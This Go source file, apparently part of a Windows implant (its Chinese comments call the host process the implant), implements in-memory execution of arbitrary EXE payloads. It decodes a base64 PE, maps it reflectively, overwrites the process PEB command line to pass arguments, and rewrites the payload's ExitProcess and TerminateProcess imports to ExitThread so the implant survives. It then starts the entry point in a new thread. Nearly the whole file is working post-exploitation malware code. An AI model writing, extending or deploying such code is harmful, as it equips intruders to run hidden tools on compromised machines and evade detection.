//go:build windows && !light

package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 内存执行 EXE（含参数）—— 反射式映射 + 命令行参数注入。
//
// 与 loadDLLMem 共用反射加载管线（映射/重定位/导入表），差别在于：
//   - EXE 没有 DllMain 约定，入口点是 AddressOfEntryPoint，需要用 CreateThread 起线程；
//   - 控制台/GUI 程序的 CRT 启动代码通过 GetCommandLineA/W（读 PEB 里的
//     RTL_USER_PROCESS_PARAMETERS.CommandLine）拿参数，因此要把我们想传的
//     命令行**写回 PEB**，否则映进去的程序会拿到植入体自己的命令行。
//
// 已知限制（在返回信息里明确告知，不做静默降级）：
//   - 只能执行与植入体同架构的 EXE（32 位镜像无法进 64 位进程）；
//   - 不要把 Go 编译的 EXE 这样跑：宿主植入体也是 Go，两个 Go runtime 在同一进程里
//     互相踩（实测载荷 argv 正常拿到，但宿主随后崩溃）；
//   - 载荷若自行退出，其 CRT（msvcrt）会调用 ExitProcess 结束**宿主进程**：
//     已对镜像自身 IAT 的 ExitProcess/TerminateProcess 做 ExitThread 重定向，
//     但 CRT 内部的调用拦不住（彻底解决需 hook 系统 API），
//     因此「跑完即退」的工具请走落地执行；
//   - 内存中运行的进程不重定向 stdout，捕获不到控制台输出。

// processBasicInformation 对应 PROCESS_BASIC_INFORMATION。
type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

// pebUnicodeString 对应 UNICODE_STRING。
type pebUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// pebParamsOffset 返回 PEB→ProcessParameters 与 ProcessParameters→CommandLine 的偏移。
// 偏移按 Windows 公开结构（x64: 0x20 / 0x70；x86: 0x10 / 0x40）。
func pebParamOffsets() (pebParams, cmdLine uintptr) {
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		return 0x20, 0x70
	}
	return 0x10, 0x40
}

// currentProcessParameters 取当前进程 PEB 里的 RTL_USER_PROCESS_PARAMETERS 地址。
func currentProcessParameters() (uintptr, error) {
	procNtQueryInformationProcess := resolveAPI("ntdll.dll", "NtQueryInformationProcess")
	if procNtQueryInformationProcess.resolved() == 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess 不可用")
	}
	var pbi processBasicInformation
	var ret uint32
	status, _, _ := procNtQueryInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&ret)),
	)
	if status != 0 || pbi.PebBaseAddress == 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess 失败 (status=0x%x)", status)
	}
	pebParamsOff, _ := pebParamOffsets()
	params := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + pebParamsOff))
	if params == 0 {
		return 0, fmt.Errorf("PEB.ProcessParameters 为空")
	}
	return params, nil
}

// patchProcessCommandLine 把 newCmd 写入当前进程 PEB 的命令行，返回恢复函数。
//
// 优先原地覆盖（省一次分配），超出原有 MaximumLength 时新分配一块并改指针。
// 调用方应在被执行的 EXE 线程结束后调用恢复函数，避免污染植入体自身的命令行。
func patchProcessCommandLine(newCmd string) (func(), error) {
	params, err := currentProcessParameters()
	if err != nil {
		return nil, err
	}
	_, cmdLineOff := pebParamOffsets()
	us := (*pebUnicodeString)(unsafe.Pointer(params + cmdLineOff))

	// 保存原值以便恢复
	origLen, origMax, origBuf := us.Length, us.MaximumLength, us.Buffer

	utf16 := syscall.StringToUTF16(newCmd) // 末尾带 NUL
	need := uint16((len(utf16) - 1) * 2)   // 不含 NUL 的长度（UNICODE_STRING.Length）

	var newBuf *uint16
	var allocated bool
	if origBuf != nil && origMax >= uint16(len(utf16)*2) {
		newBuf = origBuf
	} else {
		addr, aerr := windows.VirtualAlloc(0, uintptr(len(utf16)*2), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if aerr != nil {
			return nil, fmt.Errorf("分配命令行缓冲失败: %v", aerr)
		}
		newBuf = (*uint16)(unsafe.Pointer(addr))
		allocated = true
	}
	dst := unsafe.Slice(newBuf, len(utf16))
	copy(dst, utf16)

	us.Buffer = newBuf
	us.Length = need
	us.MaximumLength = uint16(len(utf16) * 2)

	restore := func() {
		us.Length = origLen
		us.MaximumLength = origMax
		us.Buffer = origBuf
		if allocated {
			_ = windows.VirtualFree(uintptr(unsafe.Pointer(newBuf)), 0, windows.MEM_RELEASE)
		}
	}
	return restore, nil
}

// redirectExitImports 把映射镜像里对 ExitProcess / RtlExitUserProcess / TerminateProcess
// 的导入重定向到 ExitThread。
//
// 为什么必须做：内存执行的 EXE 正常返回时，其 CRT 会调 exit()→ExitProcess，而宿主
// 就是植入体本身——不拦的话载荷一跑完就把植入体一起干掉（实测 attrib.exe/cmd.exe 均如此）。
// donut 也是靠 Thread=1 + ExitOpt=1 才避免这个问题；这里在 IAT 层面直接改指针，
// 让载荷的"退出进程"变成"退出线程"，不影响植入体。
func redirectExitImports(base uintptr, info *memPE) int {
	procExitThread := resolveAPI("kernel32.dll", "ExitThread")
	exitThreadAddr := procExitThread.resolved()
	if exitThreadAddr == 0 {
		return 0
	}

	// 需要拦截的目标地址（逐个模块取，取不到就跳过）
	targets := map[uintptr]bool{}
	for _, spec := range []struct{ dll, fn string }{
		{"kernel32.dll", "ExitProcess"},
		{"kernel32.dll", "TerminateProcess"},
		{"ntdll.dll", "RtlExitUserProcess"},
		{"ntdll.dll", "NtTerminateProcess"},
	} {
		if p := resolveAPI(spec.dll, spec.fn); p.resolved() != 0 {
			targets[p.resolved()] = true
		}
	}
	if len(targets) == 0 {
		return 0
	}

	redirected := 0
	step := uint32(4)
	if info.is64 {
		step = 8
	}
	descRVA := info.importRVA
	for info.importRVA != 0 {
		firstThunkRVA := binary.LittleEndian.Uint32(memBytes(base, descRVA+16, 4))
		if firstThunkRVA == 0 {
			break
		}
		iatRVA := firstThunkRVA
		for {
			cur := readThunk(base, iatRVA, info.is64)
			if cur == 0 {
				break
			}
			if cur != 0 && targets[uintptr(cur)] {
				// ExitThread(0)：载荷调用"退出进程"只结束自己所在线程。
				// 镜像映射完成后其节页已是 RX/RW（不再有 RWX），所以这里先临时把
				// 该 IAT 项所在页改回 RW，写完立即还原原保护。
				if werr := withWritable(base+uintptr(iatRVA), uintptr(step), func() {
					writeThunk(base, iatRVA, info.is64, exitThreadAddr)
				}); werr == nil {
					redirected++
				}
			}
			iatRVA += step
		}
		descRVA += 20
		if binary.LittleEndian.Uint32(memBytes(base, descRVA+12, 4)) == 0 &&
			binary.LittleEndian.Uint32(memBytes(base, descRVA+16, 4)) == 0 {
			break
		}
	}
	return redirected
}

// runMappedImage 反射式内存执行 EXE，并把 args 作为命令行参数传入。
//
// imageName 作为 argv[0]（为空时用 "program.exe"）；waitMs > 0 时等待线程结束
// 并返回退出码，否则立即返回（程序继续在后台线程运行）。
func runMappedImage(dataB64, args, imageName string, waitMs int) (string, int32, string) {
	raw, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}
	if len(raw) < 0x40 {
		return "", -1, "payload too small to be a PE"
	}
	// 架构校验：32/64 位镜像不能跨架构映射进当前进程
	if err := checkPEArchMatch(raw); err != nil {
		return "", -1, err.Error()
	}

	if imageName == "" {
		imageName = "program.exe"
	}
	cmdLine := `"` + imageName + `"`
	if args != "" {
		cmdLine += " " + args
	}

	// 先注入命令行，再映射执行（CRT 启动时读 PEB）
	restore, perr := patchProcessCommandLine(cmdLine)
	if perr != nil {
		// 参数注入失败不阻断执行：仅在无参场景下降级，带参场景明确报错
		if args == "" {
			restore = func() {}
		} else {
			return "", -1, fmt.Sprintf("无法注入命令行参数（%v）：内存执行 exe 需要 PEB 命令行补丁", perr)
		}
	}

	base, info, err := mapImagePE(raw)
	if err != nil {
		restore()
		return "", -1, fmt.Sprintf("reflective load failed: %v", err)
	}
	if info.entryRVA == 0 {
		restore()
		return "", -1, "PE has no entry point"
	}
	entry := base + uintptr(info.entryRVA)

	// 拦掉载荷的"退出进程"调用，避免它跑完把植入体一起带走
	exitRedirects := redirectExitImports(base, info)

	procCreateThread := resolveAPI("kernel32.dll", "CreateThread")
	if procCreateThread.resolved() == 0 {
		restore()
		return "", -1, "CreateThread 不可用"
	}
	var tid uint32
	hThread, _, callErr := procCreateThread.Call(0, 0, entry, 0, 0, uintptr(unsafe.Pointer(&tid)))
	if hThread == 0 {
		restore()
		return "", -1, fmt.Sprintf("CreateThread 失败: %v", callErr)
	}

	result := fmt.Sprintf("EXE 已在内存中执行：基址 0x%x，入口 0x%x，线程 %d，命令行 %q（%d 字节镜像，退出拦截 %d 处）",
		base, entry, tid, cmdLine, len(raw), exitRedirects)

	if waitMs <= 0 {
		restore()
		return result + "\n[!] 未等待线程结束（wait_ms=0），程序在后台线程继续运行", 0, ""
	}

	// 注意：已对镜像自身 IAT 里的 ExitProcess/TerminateProcess 做了 ExitThread 重定向，
	// 但载荷 CRT（msvcrt/kernelbase）内部直接调用的 ExitProcess 拦不住——这类载荷
	// 一旦自行退出仍会带走植入体。需要"跑完即退"的程序请改用落地执行/plugin_exe。
	procWait := resolveAPI("kernel32.dll", "WaitForSingleObject")
	var exitCode uint32
	if procWait.resolved() != 0 {
		start := time.Now()
		procWait.Call(hThread, uintptr(waitMs))
		if elapsed := time.Since(start); elapsed >= time.Duration(waitMs)*time.Millisecond {
			restore()
			return result + fmt.Sprintf("\n[!] 等待 %dms 超时，程序仍在后台线程运行（线程 %d）", waitMs, tid), 0, ""
		}
	} else {
		time.Sleep(time.Duration(waitMs) * time.Millisecond)
	}
	if procGetExit := resolveAPI("kernel32.dll", "GetExitCodeThread"); procGetExit.resolved() != 0 {
		procGetExit.Call(hThread, uintptr(unsafe.Pointer(&exitCode)))
	}
	restore()
	return result + fmt.Sprintf("\n线程已结束，退出码 %d（注：内存执行不重定向 stdout，无控制台输出）", int32(exitCode)), int32(exitCode), ""
}

// checkPEArchMatch 校验 PE 机器码与当前植入体架构一致。
func checkPEArchMatch(raw []byte) error {
	eLfanew := int(binary16(raw, 0x3C))
	if eLfanew <= 0 || eLfanew+6 > len(raw) {
		return fmt.Errorf("invalid PE header offset")
	}
	machine := binary16(raw, eLfanew+4)
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		if machine == 0x014c { // IMAGE_FILE_MACHINE_I386
			return fmt.Errorf("载荷是 32 位 PE，无法在 64 位植入体中内存执行（请用 32 位植入体或改用落地执行）")
		}
	} else if machine == 0x8664 { // IMAGE_FILE_MACHINE_AMD64
		return fmt.Errorf("载荷是 64 位 PE，无法在 32 位植入体中内存执行")
	}
	return nil
}

func binary16(b []byte, off int) uint16 {
	if off < 0 || off+2 > len(b) {
		return 0
	}
	return uint16(b[off]) | uint16(b[off+1])<<8
}
